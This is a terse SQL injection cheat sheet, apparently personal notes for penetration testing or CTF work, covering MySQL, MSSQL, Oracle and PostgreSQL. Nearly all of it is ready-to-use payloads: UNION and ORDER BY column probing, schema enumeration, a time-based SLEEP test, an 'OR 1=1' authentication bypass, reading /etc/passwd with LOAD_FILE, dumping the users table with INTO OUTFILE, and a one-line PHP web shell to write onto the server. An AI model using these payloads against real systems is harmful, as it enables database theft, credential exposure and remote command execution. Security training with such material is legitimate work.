[[mssql]] [[mysql]] [[oracle]] [[postgresql]]
[[sql]]
cheat-sheet/cheatsheet/cheat sheet
https://portswigger.net/web-security/sql-injection/cheat-sheet

##### Detect type and version
mssql, mysql - `select @@version`
oracle - `select * from v$version`
postgresql - `select version()`

#### Get database
mysql - database()
postgresql - current_database()


##### Detect number of original query columns
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
etc. until error occurs
or
until success
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--`
```
##### Useful queries
* `SELECT * FROM information_schema.tables`
* `SELECT table_name FROM information_schema.tables`
* `select column_name from information_schema.columns where table_name='users';`
*  `select group_concat(column_name) from information_schema.columns where table_name='users';`
*   `' UNION SELECT SLEEP(5),2 where database() like 'u%';--`
* `' OR 1=1;--`
* May be used another quotes like \```
#### Fuzzing SQLi
https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt


#### Privileges

Check for file privileges:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

#### load file

```sql
SELECT LOAD_FILE('/etc/passwd');
```

#### write file
shell
```php
<?php system($_REQUEST[0]); ?>
```

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
secure_file_priv defines scope of of available files, if empty - permits everything

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

hint for working with bin data:
```sql
FROM_BASE64("base64_data")'
```